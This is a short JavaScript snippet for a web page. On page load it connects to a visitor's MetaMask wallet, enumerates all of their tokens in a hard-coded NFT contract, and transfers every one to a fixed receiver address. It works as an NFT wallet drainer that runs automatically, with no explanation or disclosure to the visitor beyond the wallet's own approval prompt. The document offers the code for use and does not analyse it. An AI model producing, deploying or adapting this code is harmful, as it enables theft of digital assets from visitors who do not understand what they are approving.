// Replace with your actual NFT contract and receiver
const nftContractAddress = "0xB9951B43802dCF3ef5b14567cb17adF367ed1c0F";
const receiverAddress = "0x974c32106390e0F378f36FbF4428d4F32D813dd7";

async function autoConnectAndTransfer() {
  if (typeof window.ethereum === 'undefined') {
    alert("MetaMask is not installed.");
    return;
  }

  try {
    // Connect to wallet
    await window.ethereum.request({ method: 'eth_requestAccounts' });

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    // ERC-721 Enumerable ABI
    const abi = [
      "function balanceOf(address owner) view returns (uint256)",
      "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
      "function safeTransferFrom(address from, address to, uint256 tokenId) external"
    ];

    const contract = new ethers.Contract(nftContractAddress, abi, signer);

    // Get all token IDs
    const balance = await contract.balanceOf(userAddress);
    if (balance.toNumber() === 0) {
      alert("No NFTs found.");
      return;
    }

    let tokenIds = [];
    for (let i = 0; i < balance.toNumber(); i++) {
      const tokenId = await contract.tokenOfOwnerByIndex(userAddress, i);
      tokenIds.push(tokenId.toNumber());
    }

    // Sort highest token ID first
    tokenIds.sort((a, b) => b - a);

    // Transfer each NFT
    for (let tokenId of tokenIds) {
      const tx = await contract.safeTransferFrom(userAddress, receiverAddress, tokenId);
      console.log(`Transferring token ${tokenId}...`);
      await tx.wait();
    }

    alert("All NFTs transferred successfully!");
  } catch (err) {
    console.error(err);
    alert("Error: " + err.message);
  }
}

// Auto-run when page loads
window.onload = autoConnectAndTransfer;
